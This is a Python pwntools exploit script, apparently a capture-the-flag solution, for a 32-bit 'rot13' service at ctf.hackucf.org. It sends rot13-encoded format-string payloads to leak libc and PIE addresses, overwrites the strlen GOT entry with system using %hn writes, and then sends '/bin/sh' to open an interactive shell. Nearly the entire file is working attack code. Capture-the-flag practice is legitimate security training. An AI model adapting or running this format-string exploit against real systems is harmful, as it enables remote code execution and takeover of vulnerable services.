from pwn import *
import string

def rot13(plain):
    lower = string.lowercase
    upper = string.uppercase
    cipher = ""

    for x in plain:
        if x.isalpha() == True:
            if x.islower() == True:
                cipher += lower[(lower.index(x) + 13) % 26]
            elif x.isupper() == True:
                cipher += upper[(upper.index(x) + 13) % 26]
        else:
            cipher += x

    return cipher

def main():
    offset = 7

    #r = process("./rot13")
    r = remote("ctf.hackucf.org",20006)
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("rot13-libc.so")

    # leak data
    r.recvuntil("Enter some text to be rot13 encrypted:\n")
    p = rot13("%2$p.%3$p")
    r.sendline(p)
    r.recvuntil("Rot13 encrypted data: ")
    leak = r.recvline().strip().split(".")

    print(leak)
    libc_base = int(leak[0],16) - (libc.symbols['__ctype_b_loc'] + 5)
    pie = int(leak[1],16) - 0x95b
    print(hex(libc_base))
    print(hex(pie))

    #calculate system and strlen got
    system = libc_base + libc.symbols['system']
    strlen_got = pie + 0x00001fd4
    print(hex(system))
    print(hex(strlen_got))

    # payload generate
    p = ""
    p += p32(strlen_got) + p32(strlen_got + 2)
    # system
    write = hex(system)[2:]
    print(write)

    part1 = int(write[4:],16) - 8
    part2 = int(write[:4],16) - int(write[4:],16)

    p += "%" + str(part1) + "c" + "%7$hn"
    p += "%" + str(part2) + "c" + "%8$hn"

    p = rot13(p)
    r.sendline(p)
    r.sendline("/bin/sh")
    r.interactive()



if __name__ == "__main__":
    main()
    #print(rot13("A"))
